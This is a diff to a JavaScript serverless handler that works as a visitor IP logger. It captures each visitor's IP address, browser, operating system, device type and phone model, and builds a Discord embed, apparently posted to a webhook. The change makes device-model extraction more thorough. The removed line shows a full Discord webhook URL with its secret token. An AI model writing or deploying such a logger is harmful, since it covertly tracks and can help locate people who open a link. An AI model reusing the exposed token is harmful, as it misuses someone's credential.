@@ -1,5 +1,5 @@
 export default async function handler(req, res) {
-    const webhookUrl = "https://discord.com/api/webhooks/1377330816664731709/bl_oh9S8js6rhNgBNMmqSplQc7f__4dde322QGU-qSnq-VzQVvjQ_JwRjwDDQX2SDa6I";
+    const webhookUrl = "https://discord.com/api/webhooks/SEU_WEBHOOK_AQUI";
 
     const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;
 
@@ -15,7 +15,31 @@ export default async function handler(req, res) {
 
     const userAgent = req.headers["user-agent"] || "Desconhecido";
 
-    // 🔍 Parser simples de User Agent + Modelo
+    function extractModel(ua) {
+        let model = "Desconhecido";
+
+        let match = ua.match(/;\s?([A-Za-z0-9\-]+)\s?Build/i);
+        if (match && match[1]) {
+            model = match[1];
+            return model;
+        }
+
+        match = ua.match(/([^)]+)/);
+        if (match && match[1]) {
+            const parts = match[1].split(";").map(p => p.trim());
+            for (let i = parts.length - 1; i >= 0; i--) {
+                const p = parts[i];
+                if (p.match(/^[A-Za-z0-9\-]+$/) && p.length >= 4 && p.length <= 15) {
+                    model = p;
+                    break;
+                }
+            }
+        }
+
+        return model;
+    }
+
+    // Parser simples para navegador e SO
     function parseUserAgent(ua) {
         let browser = "Desconhecido";
         if (ua.includes("Chrome")) browser = "Chrome";
@@ -33,17 +57,11 @@ export default async function handler(req, res) {
 
         const deviceType = ua.includes("Mobile") ? "Celular" : "Desktop";
 
-        // 🔍 Extrair modelo do dispositivo (Android)
-        let model = "Desconhecido";
-        const match = ua.match(/;\s?([A-Za-z0-9\-]+)\s?Build/i);
-        if (match && match[1]) {
-            model = match[1];
-        }
-
-        return { browser, os, deviceType, model };
+        return { browser, os, deviceType };
     }
 
-    const { browser, os, deviceType, model } = parseUserAgent(userAgent);
+    const model = extractModel(userAgent);
+    const { browser, os, deviceType } = parseUserAgent(userAgent);
 
     const embed = {
         embeds: [
@@ -80,4 +98,4 @@ export default async function handler(req, res) {
     });
 
     res.status(200).end();
-}
+        }
